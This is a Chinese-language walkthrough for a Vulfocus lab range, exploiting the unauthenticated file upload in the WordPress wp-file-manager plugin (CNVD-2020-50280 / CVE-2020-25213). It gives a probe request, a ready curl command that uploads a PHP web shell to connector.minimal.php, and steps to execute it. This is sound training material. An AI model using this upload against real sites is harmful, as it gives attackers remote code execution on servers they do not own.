# 178｜WordPress File Manager 未授权上传（CNVD-2020-50280）

- 镜像：`vulfocus/wordpress-cnvd_2020_50280`
- 题库端口：`80,3306`

## 编号说明

**CNVD-2020-50280** 与 **CVE-2020-25213** 为同一件事：wp-file-manager 6.0–6.8 暴露 elFinder `connector.minimal.php`。Vulfocus 文档有时误写成 CVE-2020-50280。[S1][S2]

## 一句话打法

未授权 POST `connector.minimal.php`，`cmd=upload` 把 PHP 写到 `lib/files/`。[S3]

## 操作步骤

1. 探测：`GET .../wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php`，漏洞版常返回 `{"error":["errUnknownCmd"]}`。[S3]
2. 上传（PowerShell 用 `curl.exe -F`，不要让 shell 改文件内容）：[S3]

   ```powershell
   curl.exe -i -F "cmd=upload" -F "target=l1_Lw" -F "upload[]=@shell.php" "http://<靶场IP>/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
   ```

3. 按 JSON `added[0].url` 访问 `.../lib/files/` 下文件。成功信号：PHP 执行。6.9 移除该 endpoint。[S2][S4]

## 本题特有排坑

- 不要和 CVE-2020-25214 搞混。[S2]
- `target=l1_Lw` 表示 elFinder 根；改错 target 会 `errTrg`。[S3]
- 必须未授权可打到 `connector.minimal.php`；后台 File Manager 菜单不是本链入口。

## 来源

- [S1] CNVD 镜像记录。详见[来源清单](../sources/178_CNVD-2020-50280_wordpress/_meta.md)。
- [S2] NVD CVE-2020-25213。详见[来源清单](../sources/178_CNVD-2020-50280_wordpress/_meta.md)。
- [S3] 上传 PoC 脚本。详见[来源清单](../sources/178_CNVD-2020-50280_wordpress/_meta.md)。
- [S4] FortiGuard / NOSEC 环境说明。详见[来源清单](../sources/178_CNVD-2020-50280_wordpress/_meta.md)。
